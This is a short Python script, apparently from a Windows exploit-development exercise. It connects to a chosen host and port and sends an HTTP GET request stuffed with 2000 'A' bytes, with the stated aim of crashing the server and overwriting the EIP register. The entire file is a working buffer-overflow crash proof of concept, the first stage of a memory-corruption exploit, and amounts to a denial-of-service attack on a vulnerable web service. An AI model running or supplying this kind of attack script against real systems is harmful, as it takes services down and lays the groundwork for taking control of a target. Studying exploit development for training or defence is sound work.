#!/usr/bin/env python3

# author: greyshell

import argparse
import sys
import socket


def exploit(host, port):
    """
    replicate the crash by sending 2000 bytes buffer and overwrite EIP
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    buffer = "GET "
    buffer += "A" * 2000
    buffer += " HTTP/1.1\r\n\r\n"

    s.send(bytes(buffer, "utf-8"))
    print(f"[*] buffer has been sent to target")
    s.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="windows exploit dev")
    parser.add_argument("-t", "--target_host", metavar="", help="provide the hostname", required=True)
    parser.add_argument("-p", "--port", metavar="", help="provide the port", required=True)
    args = parser.parse_args()

    if len(sys.argv) < 3:
        parser.print_help(sys.stderr)
        sys.exit(0)

    exploit(args.target_host, int(args.port))
